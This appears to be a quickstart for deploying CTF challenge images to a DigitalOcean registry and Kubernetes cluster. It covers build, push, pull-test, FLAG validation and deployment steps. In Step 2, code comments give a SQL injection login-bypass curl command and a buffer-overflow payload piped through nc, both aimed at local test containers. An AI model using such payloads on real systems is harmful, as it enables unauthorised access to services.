# Quickstart: Challenge Base Images & DOCR

**Feature**: 004-base-images-docr | **Date**: 2026-03-25

## Prerequisites

- Docker with BuildKit enabled (Docker ≥ 20.10)
- `doctl` installed and authenticated (`doctl auth init`)
- DOKS cluster `infodays-ctf` provisioned (Phase 1 complete)
- DOCR `infodays-registry` provisioned (Phase 1 complete)

---

## Step 1: Authenticate to DOCR

```sh
bash scripts/setup-docr.sh
```

Expected output:
```
Logging in to registry.digitalocean.com...
Login Succeeded
DOKS ↔ DOCR integration: active
```

---

## Step 2: Build & Test a Service Image Locally

### Web challenge

```sh
docker build -t base-web:local challenges/base-images/web/
docker run --rm -e FLAG="infodays{test}" -p 8080:8080 base-web:local
# In another terminal: curl http://localhost:8080/
# SQLi bypass: curl -s -c /tmp/j -b /tmp/j -X POST http://localhost:8080/login \
#   --data-urlencode "username=admin' OR '1'='1' --" \
#   --data-urlencode "password=x" -D - | head -5
# Then: curl -s -c /tmp/j -b /tmp/j http://localhost:8080/flag
```

### Pwn challenge

```sh
docker build -t base-pwn:local challenges/base-images/pwn/
docker run --rm -e FLAG="infodays{test}" -p 1337:1337 base-pwn:local
# In another terminal: nc localhost 1337
# Exploit payload: python3 -c "import sys; sys.stdout.buffer.write(b'A'*76 + b'\xef\xbe\xad\xde' + b'\n')" | nc localhost 1337
```

### Misc challenge

```sh
docker build -t base-misc:local challenges/base-images/misc/
docker run --rm -e FLAG="infodays{test}" -p 4444:4444 base-misc:local
# In another terminal: nc localhost 4444
```

---

## Step 3: Build & Extract a Static Archive

```sh
docker buildx build \
  --build-arg FLAG="infodays{static_test}" \
  --output type=local,dest=./dist \
  challenges/base-images/static/

unzip -p ./dist/challenge.zip flag.txt
# → infodays{static_test}
```

---

## Step 4: Push Base Images to DOCR

```sh
bash scripts/push-challenge.sh base-web  challenges/base-images/web
bash scripts/push-challenge.sh base-pwn  challenges/base-images/pwn
bash scripts/push-challenge.sh base-misc challenges/base-images/misc
```

Each command prints the full registry path on success:
```
Pushed: registry.digitalocean.com/infodays-registry/base-web:latest
```

---

## Step 5: Verify Images Are Pullable from the Cluster

```sh
kubectl run pull-test \
  --image=registry.digitalocean.com/infodays-registry/base:web \
  --restart=Never --namespace=challenges \
  --overrides='{
    "spec": {
      "securityContext": {
        "runAsNonRoot": true,
        "runAsUser": 1000,
        "seccompProfile": {"type": "RuntimeDefault"}
      },
      "containers": [{
        "name": "pull-test",
        "image": "registry.digitalocean.com/infodays-registry/base:web",
        "command": ["sleep", "10"],
        "env": [{"name": "FLAG", "value": "infodays{pull_test}"}],
        "securityContext": {
          "allowPrivilegeEscalation": false,
          "capabilities": {"drop": ["ALL"]}
        },
        "imagePullPolicy": "Always"
      }],
      "imagePullSecrets": [{"name": "docr-pull-secret"}]
    }
  }'
kubectl wait --for=condition=Ready pod/pull-test -n challenges --timeout=60s
kubectl delete pod pull-test -n challenges
```

If the pod reaches `Running`, DOCR pull access is confirmed.

> **Why the overrides?** The `challenges` namespace enforces `restricted` PodSecurity
> policy. The base image also requires a `FLAG` env var or it exits immediately.
> Both must be satisfied for the pod to reach `Ready`.

---

## Smoke Test: Verify FLAG Validation

Service images must refuse to start without a FLAG:

```sh
docker run --rm base-web:local
# Expected: "ERROR: FLAG environment variable is required and must not be empty." (stderr)
# Expected exit code: 1

docker run --rm -e FLAG="" base-pwn:local
# Expected: same error (empty string treated as unset)
```

---

## Publishing a Custom Challenge Image

For a new challenge built from a base image:

```sh
# 1. Create your challenge directory and Dockerfile
# 2. Build and test locally
docker build -t my-challenge:local path/to/my-challenge/

# 3. Push to DOCR
bash scripts/push-challenge.sh my-challenge path/to/my-challenge my-tag
# Pushes: registry.digitalocean.com/infodays-registry/my-challenge:my-tag
```

## Step 6: Deploy Challenge End-to-End (recommended)

After pushing the image, use `deploy-challenge.sh` to automate all remaining steps
(CTFd entry, ConfigMap update, controller restart, bulk_spawn, flag import):

```sh
export CTFD_URL=https://ctfd.infodays.net
export CTFD_ADMIN_TOKEN=<token>
export CTF_MASTER_SECRET=<secret>

bash scripts/deploy-challenge.sh challenges/manifests/web-sqli.yaml
```

This single command:
1. Ensures the manifest is in `challenges/manifests/`
2. Creates the challenge in CTFd (idempotent)
3. Updates the `challenge-manifests` ConfigMap
4. Restarts the controller API (clears manifest cache)
5. Runs `bulk_spawn` to create K8s resources for all teams
6. Imports per-team HMAC flags into CTFd

### Important: Challenge Port Mapping

| Type | Container Port | Access Pattern |
|------|---------------|----------------|
| web  | 8080 | `https://team-{id}-{challenge-id}.challenges.infodays.net` |
| pwn  | 1337 | `nc challenges.infodays.net {assigned-port}` |
| misc | 4444 | `nc challenges.infodays.net {assigned-port}` |
